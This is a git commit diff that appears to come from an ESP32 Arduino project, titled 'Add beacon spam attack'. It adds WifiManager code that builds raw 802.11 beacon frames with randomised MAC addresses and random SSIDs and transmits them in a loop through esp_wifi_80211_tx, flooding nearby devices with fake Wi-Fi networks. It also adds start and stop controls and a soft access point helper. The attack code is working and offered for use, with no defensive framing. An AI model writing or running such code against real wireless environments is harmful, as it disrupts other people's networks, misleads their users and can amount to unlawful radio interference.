b7eaa39e11a3b5a7bc2565916cdbf4d602f5e712
bexposito <bruno.exposito@gmail.com>
2025-05-30 17:04:51 +0200

    Add beacon spam attack

--- include/WifiManager.h
+++ include/WifiManager.h
@@ -2,13 +2,21 @@
 #include <Arduino.h>
 #include <vector>
 #include "WifiNetwork.h"
+const uint8_t MAX_NETWORKS_BEACON_SPAM = 10;
 
 class WifiManager {
     public:
         static void connect(String ssid, String password);
         static void init();
+        static void create(String uuid, String password);
         static std::vector<WifiNetwork> getNetworks();
+        static void beaconSpam();
+        static void runBeaconSpam();
+        static void stopBeaconSpam();
+        static bool isRunningBeaconSpam();
 
     private:
-        
+        static void sendBeacon(const String ssid);
+        static bool run;
+
 };
--- src/WifiManager.cpp
+++ src/WifiManager.cpp
@@ -1,8 +1,40 @@
 #include "WifiManager.h"
 #include <WiFi.h>
+#include <esp_wifi.h>
 #include <vector>
 #include "secrets.h"
+#include "Utils.h"
 #include "WifiNetwork.h"
+
+
+bool WifiManager::run = false;
+
+
+uint8_t beaconPacket[] = {
+  0x80, 0x00, // Frame control (Beacon frame)
+  0x00, 0x00, // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest: broadcast
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (se llenará luego)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID MAC (se llenará luego)
+  0x00, 0x00, // Seq
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x64, 0x00, // Interval
+  0x01, 0x04  // Capabilities
+};
+
+
+
+void WifiManager::runBeaconSpam() {
+  run = true;
+}
+
+void WifiManager::stopBeaconSpam() {
+  run = false;
+}
+
+bool WifiManager::isRunningBeaconSpam() {
+  return run;
+}
 
 void WifiManager::init() {
   WiFi.mode(WIFI_AP_STA);
@@ -25,6 +57,11 @@ void WifiManager::connect(const String ssid, const String password) {
   delay(200);
 }
 
+void WifiManager::create(const String ssid, const String password) {
+  WiFi.softAP(ssid, password);
+}
+
+
 
 std::vector<WifiNetwork> WifiManager::getNetworks() {
   std::vector<WifiNetwork> networks;
@@ -39,4 +76,37 @@ std::vector<WifiNetwork> WifiManager::getNetworks() {
   }
 
   return networks;
+}
+
+void WifiManager::beaconSpam() {
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  delay(100);
+
+  for (int i = 0; i < MAX_NETWORKS_BEACON_SPAM; i++) {
+    sendBeacon(Utils::randomString(20));
+    delay(100);
+  }
+}
+
+void WifiManager::sendBeacon(const String ssid) {
+  uint8_t packet[200];
+  int ssid_len = strlen(ssid.c_str());
+  int packetLen = sizeof(beaconPacket) + 2 + ssid_len;
+
+  memcpy(packet, beaconPacket, sizeof(beaconPacket));
+
+  // Generate a random mac
+  for (int i = 10; i < 16; i++) {
+    uint8_t randByte = random(256);
+    packet[i] = randByte;
+    packet[i + 6] = randByte;
+  }
+
+  // Info of SSID
+  packet[sizeof(beaconPacket)] = 0x00;
+  packet[sizeof(beaconPacket) + 1] = ssid_len;
+  memcpy(&packet[sizeof(beaconPacket) + 2], ssid.c_str(), ssid_len);
+
+  // Send the fake beacon
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, packetLen, false);
 }
